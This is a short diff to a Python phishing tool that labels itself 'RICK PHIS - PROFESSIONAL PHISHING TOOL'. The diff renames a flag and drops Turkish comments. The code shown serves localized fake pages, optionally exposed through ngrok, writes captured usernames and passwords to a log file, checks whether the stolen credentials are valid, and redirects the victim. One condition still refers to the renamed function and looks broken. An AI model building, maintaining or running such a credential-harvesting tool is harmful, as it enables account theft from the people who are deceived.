@@ -47,7 +47,6 @@ print(Fore.RESET)
 
 path_separator = '\\' if platform.system() == 'Windows' else '/'
 
-# Dil ve hata sayfası eşlemeleri
 language_mapping = {
     'ar': f"htmls{path_separator}ar.html",
     'az': f"htmls{path_separator}az.html",
@@ -77,7 +76,6 @@ error_pages = {
 }
 
 
-# Yardım menüsü
 help_menu = f"""{Fore.WHITE}
 RICK PHIS - PROFESSIONAL PHISHING TOOL
 
@@ -182,7 +180,7 @@ def main():
             port = args.port
             output_file = args.output
             redirect_location = args.location
-            check_trust = args.check
+            check_login = args.check
 
             web_site = language_mapping.get(lang.lower())
             if not web_site:
@@ -190,14 +188,14 @@ def main():
                 continue
 
             if chosen == 1:
-                start_server(web_site, port, output_file, redirect_location, check_trust, args.ngrok_token)
+                start_server(web_site, port, output_file, redirect_location, check_login, args.ngrok_token)
             else:
                 print(f"Site {chosen} is under development. Coming soon!")
 
     except KeyboardInterrupt:
         print(Fore.YELLOW, "\nRick Phis was stopped (ctrl+c)", Fore.RESET)
 
-def start_server(web_site, port, output_file, redirect_location, check_trust, ngrok_token):
+def start_server(web_site, port, output_file, redirect_location, check_login, ngrok_token):
     class MyHTTPRequestHandler(BaseHTTPRequestHandler):
         def do_GET(self):
             file_path = self.path.strip('/')
@@ -249,7 +247,7 @@ def start_server(web_site, port, output_file, redirect_location, check_trust, ng
                     with open(output_file, 'a') as file:
                         file.write(log_message)
                 
-                if check_trust:
+                if check_login:
                     check_trust(sel_username, sel_password)
                 
                 if login_check or not check_trust:
